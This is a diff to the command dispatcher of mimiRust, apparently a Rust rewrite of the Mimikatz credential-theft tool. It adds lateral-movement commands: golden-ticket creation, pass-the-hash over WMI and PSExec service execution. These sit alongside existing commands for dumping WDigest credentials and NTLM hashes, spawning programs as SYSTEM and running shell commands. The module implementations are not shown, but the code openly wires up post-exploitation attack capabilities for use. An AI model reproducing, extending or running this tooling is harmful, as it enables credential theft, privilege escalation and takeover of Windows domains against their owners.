@@ -1,16 +1,17 @@
-pub mod authentication;
+pub mod lateral_movement;
 pub mod passwords;
 pub mod privilege;
 pub mod utilities;
 
-use authentication::{
-    pth::ExecuteWMI,
+use lateral_movement::{
     kerberos::GoldenTicket,
+    pth::ExecuteWMI,
+    scm::PSExec,
 };
 
 use passwords::{
+    ntlm::Ntlm,
     wdigest::Wdigest, 
-    ntlm::Ntlm
 };
 
 use privilege::Escalation;
@@ -101,36 +102,59 @@ fn banner() -> String {
     ".to_string();
 }
 
+// dump-credentials
+// dump-hashes
+// exit
+// golden-ticket
+// help
+// psexec
+// pth
+// shell
+// spawn-path
+
 fn handle_user_input(args: Vec<String>) -> Result<()> {
-    match args[0].as_str() {
+    match args[0].to_lowercase().as_str() {
         "dump-credentials" => {
             Wdigest::grab()?;
         },
         "dump-hashes" => {
             Ntlm::grab()?;
         },
-        "spawn-path" => {
-            if args.len() >= 1 {
-                Escalation::get_system(args[1].clone())?;
-            }
+        "exit" => {
+            println!("Bye!");
+            std::process::exit(0x100);
+        },
+        "golden-ticket" => {
+            GoldenTicket::create();
+        },
+        "help" | "h" | "?" => {
+            println!("
+            \rdump-credentials             Dumps systems credentials through Wdigest.
+            \rdump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
+            \rexit                         Exits out of mimiRust.
+            \rgolden-ticket                Creates a golden ticket for an useraccount with the domain.
+            \rhelp - h - ?                 Shows this message.
+            \rpsexec                       Executes a service on another system.
+            \rpth                          Pass-the-Hash run a command on another system.
+            \rshell <SHELL COMMAND>        Execute a shell command through cmd, returns output.
+            \rspawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location.
+            \n\n");
+        },
+        "psexec" => {
+            PSExec::new();
+        },
+        "pth" => {
+            ExecuteWMI::new();
         },
         "shell" => {
             if args.len() >= 1 {
                 Escalation::execute_shell(args)?;
             }
         },
-        "exit" => {
-            println!("Bye!");
-            std::process::exit(0x100);
-        },
-        "help" | "h" | "?" => {
-            println!("
-            \rdump-credentials             Dumps systems credentials through Wdigest
-            \rdump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions)
-            \rspawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location
-            \rshell <SHELL COMMAND>        Execute a shell command through cmd, returns output
-            \rexit                         Exits out of mimiRust
-            \n\n");
+        "spawn-path" => {
+            if args.len() >= 1 {
+                Escalation::get_system(args[1].clone())?;
+            }
         },
         _ => {
             println!("Please use: help, h or ?");
